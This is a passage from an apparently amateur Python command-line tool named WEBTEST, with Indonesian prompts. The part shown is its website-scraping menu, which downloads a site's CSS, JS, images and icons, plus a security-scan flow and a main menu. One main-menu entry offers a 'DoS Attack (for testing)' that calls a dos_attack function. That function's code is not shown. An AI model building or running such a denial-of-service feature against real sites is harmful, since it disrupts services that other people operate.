            for url_css in assets["css"]:
                name = sanitize_folder(os.path.basename(urlparse(url_css).path) or "style.css")
                dest = os.path.join(outdir, "assets", "css", name)
                ok, er = download_file(url_css, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
        elif choice == "3":
            total = len(assets["js"])
            if not total:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada JS terdeteksi.{C['RESET']}")
                continue
            type_print(f"{EMO['down']} Download JS ({total})...")
            for url_js in assets["js"]:
                name = sanitize_folder(os.path.basename(urlparse(url_js).path) or "script.js")
                dest = os.path.join(outdir, "assets", "js", name)
                ok, er = download_file(url_js, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
        elif choice == "4":
            imgs = list(assets["img"])
            icons = list(assets["icons"])
            total = len(imgs) + len(icons)
            if not total:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada assets (img/icons).{C['RESET']}")
                continue
            type_print(f"{EMO['down']} Download Assets ({total})...")
            for u in imgs:
                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"img_{random.randint(1000,9999)}")
                dest = os.path.join(outdir, "assets", "img", name)
                ok, er = download_file(u, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
            for u in icons:
                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"icon_{random.randint(1000,9999)}")
                dest = os.path.join(outdir, "assets", "icons", name)
                ok, er = download_file(u, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
        elif choice == "5":
            meta_file = os.path.join(outdir, "meta.json")
            if os.path.exists(meta_file) and os.path.getsize(meta_file) > 2:
                type_print(f"{C['G']}{EMO['ok']} Meta tags disimpan: {meta_file}{C['RESET']}")
            else:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada meta tags signifikan.{C['RESET']}")
        elif choice == "6":
            # Full: pastikan semuanya diunduh
            type_print(f"{EMO['down']} Download Full dimulai...")
            # CSS
            for url_css in assets["css"]:
                name = sanitize_folder(os.path.basename(urlparse(url_css).path) or "style.css")
                dest = os.path.join(outdir, "assets", "css", name)
                download_file(url_css, dest)
            # JS
            for url_js in assets["js"]:
                name = sanitize_folder(os.path.basename(urlparse(url_js).path) or "script.js")
                dest = os.path.join(outdir, "assets", "js", name)
                download_file(url_js, dest)
            # IMG & ICONS
            for u in list(assets["img"]) + list(assets["icons"]):
                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"res_{random.randint(1000,9999)}")
                sub = "icons" if u in assets["icons"] else "img"
                dest = os.path.join(outdir, "assets", sub, name)
                download_file(u, dest)
            # META sudah disimpan
            type_print(f"{C['G']}{EMO['ok']} Full download selesai. Cek folder: {outdir}{C['RESET']}")
        else:
            type_print(f"{C['R']}Pilihan tidak valid.{C['RESET']}")
    # tampilkan IP publik setelah keluar menu scraping
    ip = get_public_ip()
    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")

def scan_flow():
    scanner = WebsiteScanner()
    url = input_colored(f"{EMO['scan']} Masukkan URL target (https://...):")
    if not re.match(r"^https?://", url):
        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
        return
    
    # Get basic website info
    info = scanner.get_web_info(url)
    if info:
        scanner.display_web_info(info)
    
    # Perform security scan
    scan_results = scanner.scan_website(url)
    if scan_results:
        scanner.display_scan_results(scan_results)
    
    # Tampilkan IP publik setelah scan
    ip = get_public_ip()
    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")

def main():
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    while True:
        banner()
        type_print(f"{C['W']}{EMO['rocket']} Selamat datang di {C['BOLD']}WEBTEST{C['RESET']}{C['W']} — pilih menu:{C['RESET']}", 0.003)
        print(f"""
{C['BOLD']}Menu Utama:{C['RESET']}
  1) {EMO['spider']} Scraping Website
  2) {EMO['scan']} Website Security Scanner
  3) {EMO['dos']} DoS Attack (for testing)
  4) {EMO['exit']} Keluar
""")
        choice = input_colored("Pilihan kamu:")
        if choice == "1":
            scrape_flow()
            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
        elif choice == "2":
            scan_flow()
            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
        elif choice == "3":
            dos_attack()
            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
        elif choice == "4":
            type_print(f"{C['M']}{EMO['exit']} Bye!{C['RESET']}")
            break
        else:
            type_print(f"{C['R']}Pilihan tidak valid.{C['RESET']}")
            time.sleep(1.2)

if __name__ == "__main__":
    main()
